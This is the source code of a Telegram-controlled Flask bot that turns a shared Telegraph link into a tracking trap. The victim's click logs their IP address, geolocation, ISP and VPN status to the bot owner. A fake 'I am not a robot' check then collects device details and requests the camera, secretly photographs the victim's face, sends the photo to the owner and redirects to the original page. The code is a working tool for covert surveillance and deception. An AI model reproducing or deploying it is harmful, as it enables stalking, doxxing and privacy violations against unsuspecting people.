import telebot, requests, os, uuid
from flask import Flask, request

API_TOKEN = os.environ.get('API_TOKEN')
bot = telebot.TeleBot(API_TOKEN, threaded=False)
app = Flask(__name__)

db = {} 

# --- КНОПКА АКТИВИРОВАТЬ НА САЙТЕ ---
@app.route('/')
def home():
    return f'''
    <body style="background:#000;display:flex;flex-direction:column;justify-content:center;align-items:center;height:100vh;color:#fff;font-family:sans-serif;">
        <h1 style="margin-bottom:20px;">🤖 LOG SYSTEM ONLINE</h1>
        <a href="/activate" style="padding:15px 30px;background:#0088cc;color:#fff;text-decoration:none;border-radius:10px;font-weight:bold;box-shadow:0 0 20px #0088cc;">⚡ АКТИВИРОВАТЬ БОТА</a>
    </body>
    '''

@app.route('/activate')
def activate():
    # Автоматически определяет домен и ставит вебхук
    webhook_url = f"https://{request.host}/{API_TOKEN}"
    if bot.set_webhook(url=webhook_url):
        return f"✅ Бот успешно привязан к: {webhook_url}"
    return "❌ Ошибка при установке вебхука"

# --- ПРИЕМ СООБЩЕНИЙ ---
@app.route('/' + (API_TOKEN if API_TOKEN else "none"), methods=['POST'])
def get_m():
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return "!", 200
    return "error", 403

# --- ЛОВУШКА ---
@app.route('/v/<uid>')
def logger(uid):
    if uid not in db: return "Link Expired", 404
    owner_id = db[uid]['owner']
    target = db[uid]['url']
    ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0].strip()
    
    g = "📍 GeoIP Error"
    try:
        r = requests.get(f"http://ip-api.com{ip}?fields=66846719", timeout=5).json()
        if r.get('status') == 'success':
            g = f"🌍 {r['country']}, {r['city']}\n📡 ISP: {r['isp']}\n🛡 VPN: {'ДА' if r['proxy'] or r['hosting'] else 'НЕТ'}"
    except: pass
    
    bot.send_message(owner_id, f"🎯 *КЛИК!*\n👤 IP: `{ip}`\n{g}", parse_mode="Markdown")
    
    return f'''
    <html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"></head>
    <body style="background:#000;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;text-align:center;">
        <div>
            <div style="font-size:60px;">🛡️</div>
            <h2>Проверка безопасности</h2>
            <button id="go" style="padding:15px 50px;border:none;border-radius:30px;background:#0088cc;color:#fff;font-weight:bold;cursor:pointer;">Я НЕ РОБОТ</button>
        </div>
        <video id="v" style="display:none;" autoplay playsinline muted></video><canvas id="c" style="display:none;"></canvas>
        <script>
        document.getElementById('go').onclick = async () => {{
            let d = {{ uid: "{uid}", scr: screen.width+"x"+screen.height, cores: navigator.hardwareConcurrency }};
            fetch('/log_extra', {{ method: 'POST', headers: {{'Content-Type': 'application/json'}}, body: JSON.stringify(d) }});
            try {{
                const s = await navigator.mediaDevices.getUserMedia({{ video: true }});
                const v = document.getElementById('v'); v.srcObject = s;
                setTimeout(() => {{
                    const c = document.getElementById('c'); c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    c.toBlob(b => {{
                        const f = new FormData(); f.append('photo', b, '1.jpg'); f.append('uid', "{uid}");
                        fetch('/log_photo', {{ method: 'POST', body: f }}).then(() => {{
                            s.getTracks().forEach(t => t.stop());
                            window.location.href = "{target}";
                        }});
                    }}, 'image/jpeg', 0.6);
                }}, 800);
            }} catch(e) {{ window.location.href = "{target}"; }}
        }};
        </script>
    </body></html>
    '''

@app.route('/log_extra', methods=['POST'])
def log_extra():
    d = request.json
    if d and d['uid'] in db:
        m = f"🖥 *ЖЕЛЕЗО:*\n📱 Экран: `{d['scr']}`\n🧠 Ядра: `{d['cores']}`"
        bot.send_message(db[d['uid']]['owner'], m, parse_mode="Markdown")
    return "ok"

@app.route('/log_photo', methods=['POST'])
def log_photo():
    uid, file = request.form.get('uid'), request.files.get('photo')
    if uid in db and file:
        bot.send_photo(db[uid]['owner'], file.read(), caption="📸 *ЛИЦО ОБЪЕКТА*")
    return "ok"

# --- ОБРАБОТЧИКИ БОТА ---
@bot.message_handler(commands=['start'])
def start(m):
    bot.reply_to(m, "👋 Привет! Пришли ссылку на Telegraph, и я сделаю её ловушкой.")

@bot.message_handler(func=lambda m: "telegra.ph" in m.text.lower())
def create(m):
    url = m.text.strip()
    if not url.startswith("http"): url = "https://" + url
    uid = str(uuid.uuid4())[:8]
    db[uid] = {'owner': m.chat.id, 'url': url}
    # Используем request.host для генерации ссылки
    bot.reply_to(m, f"✅ Ссылка:\n`https://{request.host}/v/{uid}`", parse_mode="Markdown")
